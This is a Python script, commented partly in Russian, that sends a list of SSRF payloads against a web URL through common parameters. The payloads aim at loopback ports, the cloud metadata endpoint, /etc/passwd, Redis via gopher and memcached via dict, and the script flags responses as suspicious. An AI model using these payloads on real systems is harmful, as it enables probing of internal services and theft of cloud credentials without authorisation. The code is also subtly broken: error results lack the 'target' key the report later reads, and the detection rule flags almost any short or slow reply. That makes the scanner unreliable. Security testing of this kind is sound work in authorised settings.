import requests
from urllib.parse import urlencode
import time  

# 🆕 Полный SSRF payload set
SSRF_TARGETS = [
    "http://127.0.0.1:22", "http://localhost/admin",
    "http://169.254.169.254/latest/meta-data/",  # AWS/GCP/Azure
    "http://127.0.0.1.nip.io/", "http://localhost.", 
    "http://0/", "http://0.0.0.0:80",
    "file:///etc/passwd", "gopher://127.0.0.1:6379/_INFO",
    "dict://127.0.0.1:11211/info", "ftp://127.0.0.1:21"
]

PARAMS = ["url", "redirect", "target", "next", "u", "file", "image", "callback", "include"]

def scan_ssrf_basic(url: str):
    results = []
    
    for param in PARAMS:
        for target in SSRF_TARGETS:
            # URL encode + bypass
            encoded = requests.utils.quote(target, safe='/:')
            test_url = f"{url}?{urlencode({param: encoded})}"
            
            print(f"[*] SSRF: {param}={target[:30]}...")
            
            try:
                t0 = time.time()
                resp = requests.get(test_url, timeout=6, allow_redirects=False)
                elapsed = time.time() - t0
                
                # 🆕 Blind SSRF detection
                suspicious = (
                    any(t in resp.text.lower() for t in ["localhost", "127.0.0", "metadata", "passwd"]) or
                    elapsed > 3.0 or
                    resp.status_code not in [200, 404] or
                    len(resp.text) < 100
                )
                
                results.append({
                    "param": param,
                    "target": target,  # Исправлено на "target"
                    "status": resp.status_code,
                    "time": f"{elapsed:.1f}s",
                    "suspicious": suspicious
                })
                
            except Exception as e:
                results.append({
                    "param": param,
                    "error": str(e),
                    "suspicious": True
                })
    
    return results

def scan_ssrf(url: str) -> bool:
    print(f"🔍 SSRF scan: {url}")
    results = scan_ssrf_basic(url)
    
    suspicious = [r for r in results if r.get("suspicious")]
    
    if suspicious:
        print(f"🟠 SSRF vectors: {len(suspicious)}")
        for r in suspicious[:3]:
            # Заменено 'payload' на 'target'
            print(f"  → {r['param']}={r['target'][:20]}... ({r.get('status', '-')})")
        return True
    
    print("🟢 SSRF clean")
    return False
